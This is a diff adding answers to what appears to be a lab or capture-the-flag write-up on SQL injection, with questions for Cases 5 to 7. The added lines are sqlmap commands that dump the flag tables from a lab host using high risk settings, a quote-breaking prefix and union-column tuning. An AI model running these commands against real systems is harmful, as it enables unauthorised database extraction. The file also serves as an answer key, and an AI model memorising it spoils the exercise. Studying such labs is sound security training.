@@ -66,19 +66,19 @@ sqlmap -r case4.txt -p id --dump
 >**Q. What's the contents of table flag5? (Case #5)**
 
 ```bash
-
+sqlmap 'http://94.237.62.6:47094/case5.php?id=1' --batch --dump -T flag5 --no-cast --level=5 --risk=3
 ```
 
 >**Q. What's the contents of table flag6? (Case #6)**
 
 ```bash
-
+sqlmap 'http://94.237.62.6:47094/case6.php?col=id' --prefix='`)' -p col --batch --dump -T flag6 --no-cast --level=5 --risk=3
 ```
 
 >**Q. What's the contents of table flag7? (Case #7)**
 
 ```bash
-
+sqlmap 'http://94.237.62.6:47094/case7.php?id=1' --batch --dump -T flag7 --no-cast --union-cols=5
 ```
 
 ## Database Enumeration
